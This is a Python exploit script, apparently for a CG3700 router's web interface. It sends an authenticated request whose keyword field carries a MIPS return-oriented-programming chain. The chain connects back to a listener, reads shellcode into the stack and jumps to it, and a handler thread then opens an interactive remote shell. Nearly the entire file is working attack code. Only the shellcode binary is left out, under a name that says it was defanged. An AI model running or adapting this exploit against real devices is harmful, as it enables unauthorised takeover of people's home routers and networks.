#!/usr/bin/env python3
import string
import requests
import re
from requests.auth import HTTPBasicAuth
import sys
import struct
import argparse
from pwn import *


def handler():
    with open('sorry_defanged_exploit.bin', 'rb') as f:
        shellcode = f.read()

    l = listen(5504, '0.0.0.0')
    c = l.wait_for_connection()
    print("[+] Got connection. Sending payload.")
    l.sendline(shellcode)
    l.interactive()

def pad(length):
    return randoms(length).encode('utf-8')

def build_payload():

    context.endian = 'big'
    hardcoded_afinet = 0x80010368 # holds 00021580
    socket_addr = 0x80d95970
    connect_addr = 0x80d95d5c
    recv_addr = 0x80d9642c
    sleep_addr = 0x80d92ccc

    sockfd_addr = 0x8648d984
    sockaddr_addr = 0x864e1568
    payload_buffer_addr = 0x864df1e8 # IkeThread stack address

    payload = b""
    # we pad 0x34 * 0x4 = 208 bytes with the $gp value
    for i in range(0, 0x34):
        payload += p32(0x86cfb884, endian='big')

    payload += p32(0x49494949)  # $s0
    payload += p32(0x48484848)  # $s1
    payload += p32(0x47474747)  # $s2
    payload += p32(0x46464646)  # $s3
    payload += p32(0x45454545)  # $s4
    payload += p32(0x44444444)  # $s5
    payload += p32(0x43434343)  # $s6
    payload += p32(0x42424242)  # $s7
    payload += p32(0x41414141)  # $fp

    # -------------------------------------
    # socket(2, 1, 0)
    # -------------------------------------

    payload += p32(0x8025c5dc)  # $ra
    # 0x8025c5dc: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(8)
    payload += p32(0x801607ac)
    # 0x801607ac: addiu $a1, $zero, 1; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x801ba8b8)
    # 0x801ba8b8: move $a2, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # we could have taken advantage of the fact that we control $s0 with the overflow
    # but in order to make the ROP chain as generic as possible, we should not make
    # hypothesis about register control. This way the ROP auto-builder will work
    # regardless of the actual control we initially have on registers.
    payload += pad(0xc)
    payload += p32(0x8072c250)
    # 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x10)
    payload += p32(socket_addr)
    payload += pad(0x8)
    payload += p32(0x801602e4) # $ra
    # 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ---------------------------------------
    # connect(sockfd, sockaddr_in, socklen)
    # ---------------------------------------

    payload += pad(0x10)
    payload += p32(0x8001ef64) # $ra
    # 0x8001ef64: lw $ra, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x18)
    payload += p32(sockfd_addr - 0x4)
    payload += p32(0x80062840)
    # 0x80062840: sw $v0, 4($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x80cfee24) # $ra
    payload += pad(0x8)
    # 0x80cfee24: move $a0, $v0; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    # $a0 now contains the return value ($v0) from calling 'socket'

    # we put 0x20202020 in $a2

    payload += p32(0x80d51538)
    payload += pad(0xc)
    payload += p32(0x20202020)
    payload += pad(0xc)
    payload += p32(hardcoded_afinet)
    payload += p32(sockaddr_addr) # buffer address
    # 0x80d51538: lw $a2, ($sp); lw $ra, 0x18($sp); lw $s1, 0x14($sp); lw $s0, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += p32(0x807ebaac)
    # 0x807ebaac: lw $v0, ($s0); lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x80d00ba8)
    payload += pad(0xc)
    payload += p32(sockaddr_addr + 0x04) # sockaddr_addr + offset to put IP
    # 0x80d00ba8: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += p32(0x801b9d50)
    payload += pad(0x4)
    payload += struct.pack('>BBBB', 192, 168, 100, 2)
    # 0x801b9d50: lw $v0, ($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0xc)
    payload += p32(0x80d00ba8)
    payload += pad(0xc)
    payload += p32(sockaddr_addr) #$s1
    payload += p32(sockaddr_addr) # $s0
    # 0x80d00ba8: sw $v0, ($s1); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += p32(0x8002a95c)
    # 0x8002a95c: move $a1, $s0; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x8072c250)
    payload += pad(0xc)
    payload += p32(connect_addr)
    # 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x8)
    payload += p32(0x801602e4)
    # 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ----------------------------------------------------
    # recv(int sockfd, void *buf, size_t len, int flags);
    # ----------------------------------------------------

    payload += pad(0x10)
    payload += p32(0x80c64204)
    # 0x80c64204: lw $a1, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0xc)
    payload += p32(payload_buffer_addr)

    payload += pad(0x8)
    payload += p32(0x80a0da78)
    # 0x80a0da78: addiu $a2, $zero, 0x400; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x10)
    payload += p32(0x8001f198)
    # 0x8001f198: move $a3, $zero; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x80525698)
    payload += pad(0xc)
    payload += p32(sockfd_addr)
    # 0x80525698: lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x4)
    payload += p32(0x80428bb4)
    # 0x80428bb4: lw $a0, ($s0); lw $ra, 8($sp); lw $s1, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(0x8072c250)
    # 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x8)
    payload += p32(recv_addr)

    payload += pad(0x8)
    payload += p32(0x801602e4)
    # 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;
    # call recv($a0, $a1, $a2, $a3)

    # ----------------------------------------
    # sleep(2)
    # ----------------------------------------

    payload += pad(0x10)
    payload += p32(0x8025c5dc)
    # 0x8025c5dc: addiu $a0, $zero, 2; lw $ra, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0x8)
    payload += p32(0x8072c250)
    # 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;

    payload += pad(0x10)
    payload += p32(sleep_addr)

    payload += pad(0x8)
    payload += p32(0x801602e4)
    # 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    # ------------------------------------------
    # jump to shellcode
    # ------------------------------------------

    payload += pad(0x10)
    payload += p32(0x8072c250)
    # 0x8072c250: lw $v0, 4($sp); lw $ra, 0x10($sp); jr $ra; addiu $sp, $sp, 0x20;
    payload += pad(0xc)
    payload += p32(payload_buffer_addr)

    payload += pad(0x8)
    payload += p32(0x801602e4)
    # 0x801602e4: jalr $v0; nop; lw $ra, 4($sp); lw $s0, ($sp); jr $ra; addiu $sp, $sp, 0x10;

    payload += pad(0xc)
    payload += p32(payload_buffer_addr)
    payload += p32(payload_buffer_addr)
    # --- At this point, we're executing the received payload from the remote server
    return payload

def get_csrf_token(username, password):
    s = requests.session()
    s.auth = (username, password)
    response = s.get("http://192.168.0.1")
    response = s.get("http://192.168.0.1/controle.htm")
    if response.status_code == 200:
        _id = re.findall(
            r"\/goform\/controle\?id=([0-9]+)",
            response.content.decode('utf-8')
        )
        return _id[0] if len(_id) else None
    return None

def exploit(username, password, csrf_token):
    params = {
        "text_keyword": build_payload(),
        "text_block": "",
        "text_allow": "",
        "Action_Add": "Add",
        "Action_Del": 0,
        "Action_Function":1
    }
    s = requests.session()
    s.auth = (username, password)
    try:
        s.post(
            "http://192.168.0.1/goform/controle?id={}".format(csrf_token),
            data=params,
            allow_redirects=False,
            timeout=2
        )
    except requests.exceptions.ReadTimeout:
        return

if __name__ == "__main__":

    parser = argparse.ArgumentParser(description='CG3700 exploit.')
    parser.add_argument('-u', dest='username', type=str, default='voo', help='username')
    parser.add_argument('-p', dest='password', type=str, help='password')
    args = parser.parse_args()

    csrf_token = get_csrf_token(args.username, args.password)
    if csrf_token:
        print("[+] Login successful.")
        print("[+] Launching reverse shell handler.")
        handlerthr = Thread(target=handler)
        handlerthr.start()
        print("[+] Sending exploit payload.")
        exploit(args.username, args.password, csrf_token)
    else:
        print("[!] Could not find token. Aborting")
        sys.exit(-1)
